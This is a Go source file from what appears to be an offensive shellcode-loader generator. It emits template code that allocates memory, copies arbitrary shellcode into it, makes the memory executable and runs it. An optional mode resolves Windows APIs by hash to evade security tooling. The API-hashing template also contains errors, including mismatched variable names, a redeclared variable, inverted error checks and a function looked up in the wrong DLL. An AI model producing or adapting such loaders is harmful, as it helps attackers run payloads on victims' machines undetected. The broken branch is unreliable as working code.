package loaders

import (
	"fmt"
	"strings"
)

type SysTemplate struct {
	UseApiHashing bool
	HashMethod    string
}

func (t SysTemplate) Import() string {
	if t.UseApiHashing {
		return fmt.Sprintf(`
import (
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"

	"github.com/Binject/debug/pe"
	loader "github.com/cmepw/myph/internals"
)
        `)

	}

	return fmt.Sprintf(`
import (
	"syscall"
	"unsafe"
)
`)
}

func (t SysTemplate) Const() string {

	if t.UseApiHashing {
		return fmt.Sprintf(`
const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)
`)

	}

	return fmt.Sprintf(`
const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)

var (
    kernel32 = syscall.MustLoadDLL("kernel32.dll")
	ntdll = syscall.MustLoadDLL("ntdll.dll")

	VirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
	VirtualProtect = kernel32.MustFindProc("VirtualProtect")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

`)
}

func (t SysTemplate) Init() string {
	return fmt.Sprintf("\n")
}

func (t SysTemplate) Process() string {
	if t.UseApiHashing {
		return fmt.Sprintf(`

    ntdll, err := pe.Open("C:\\Windows\\System32\\ntdll.dll"); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer ntdll.Close()


    kernel32, err := pe.Open("C:\\Windows\\System32\\kernel32.dll"); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer kernel32.Close()


    var addr uintptr
	regionsize := uintptr(len(shellcode))
    VirtualAlloc, err := loader.LoadFunctionFromHash(loader.HashDJB2, "32b0ac787d4dba31", kernel32)
	if err != nil {
		log.Fatal(err)
	}

    addr = loader.HashedCall(
        VirtualAlloc,
        0,
        regionSize,
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE,
    )

    if addr == 0 {
        log.Fatal("Error: null return value")
    }

    RtlCopyMemory, err := loader.LoadFunctionFromHash(loader.HashDJB2, "7a4c2ed807c8fcf1", ntdll)
    if err != nil {
		log.Fatal(err)
	}

    rvalue := loader.HashedCall(
        RtlCopyMemory,
        addr,
        (uintptr)(unsafe.Pointer(&shellcode[0])),
        regionsize,
    ); if addr != 0 {
        log.Fatal("Error: invalid return value")
    }

    oldProtect := PAGE_READWRITE
    VirtualProtect, err := loader.LoadFunctionFromHash(loader.HashDJB2, "7126a1d34679917e", ntdll)
    if err != nil {
		log.Fatal(err)
	}

    rvalue := loader.HashedCall(
        VirtualProtect,
        addr,
        regionsize,
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtect)),
    ); if addr != 0 {
        log.Fatal("Error: invalid return value")
    }

    _, _, _ = syscall.SyscallN(addr)

        `)
	}

	return fmt.Sprintf(`
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	oldProtect := PAGE_READWRITE
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	_, _, _ = syscall.SyscallN(addr)
`)
}

func (t SysTemplate) GetTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

func ExecuteOrderSixtySix(shellcode []byte) {

__IMPORT__INIT__

__IMPORT__PROCESS__

}
`
	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)

	return template
}
